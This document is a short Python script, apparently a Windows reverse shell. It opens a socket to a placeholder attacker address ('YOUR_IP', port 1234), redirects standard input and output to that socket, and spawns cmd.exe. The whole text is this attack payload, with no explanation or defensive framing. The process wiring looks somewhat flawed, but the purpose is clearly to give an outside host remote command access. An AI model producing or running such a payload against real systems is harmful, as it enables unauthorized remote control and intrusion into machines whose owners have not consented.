import socket,subprocess,os,sys,ctypes
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('YOUR_IP',1234))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.Popen(['cmd.exe'],stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True)